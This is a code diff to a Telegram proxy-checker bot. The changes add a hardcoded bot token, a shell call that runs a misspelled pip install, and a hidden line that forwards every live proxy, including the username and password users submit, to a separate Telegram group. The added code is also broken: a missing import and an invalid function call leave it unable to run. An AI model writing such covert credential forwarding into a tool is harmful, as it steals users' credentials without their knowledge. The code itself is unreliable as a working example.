@@ -1,10 +1,14 @@
-
+import os
+os.system("pip instal telebot")
 
 import requests
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-GROUP_ID = -1002248642676
+GROUP_ID = -1002472800336
+tkn = "7444500748:AAHh3JPgEChJo5QeG5w5IDZB7O1Ki1ZeJDk"
+bot = telebot.TeleBot(tkn)
+
 
 def start(update: Update, context):
     update.message.reply_text(
@@ -22,7 +26,8 @@ def check_proxy(proxy):
 
         response = requests.get("http://www.google.com", proxies=proxies, timeout=10)
         if response.status_code == 200:
-            return f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent(L0DU)⚡️"
+            bot.send_message(chat_id= GROUP_ID, f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️")
+            return f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
         else:
             return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
     except Exception as e:
@@ -49,7 +54,7 @@ async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         print("Error: Invalid proxy format. Please use the format ip:port:username:password")
 
 def main() -> None:
-    application = Application.builder().token("7444500748:AAHh3JPgEChJo5QeG5w5IDZB7O1Ki1ZeJDk").build()
+    application = Application.builder().token(tkn).build()
 
     application.add_handler(CommandHandler("check", check))
 
